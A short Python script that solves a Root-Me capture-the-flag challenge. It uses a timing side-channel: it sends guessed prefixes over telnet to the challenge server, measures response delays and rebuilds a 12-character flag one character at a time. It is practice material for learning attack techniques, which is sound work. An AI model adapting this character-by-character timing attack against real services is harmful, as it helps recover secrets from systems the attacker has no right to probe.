#!/usr/bin/python
import time
import telnetlib

result=""
i=0

ca=["1","2","3","4","5","6","7","8","9","0","-"]
tn = telnetlib.Telnet('challenge01.root-me.org',51015)
print(tn.read_some())
delay = 0

while (len(result)<12) and i < len(ca):
	chaine="{}{}".format(result,ca[i])
	debut=time.time()
	tn.write(chaine)
	tn.read_some()
	fin=time.time()
	delta = fin - debut
	print(ca[i] + ": ", delta)
	if((fin-debut) >= 0.5 + delay):
		print(chaine)
		result+=ca[i]
		delay += 0.5
		i=0
		continue
	i+=1

print('Le flag est : {}'.format(result))
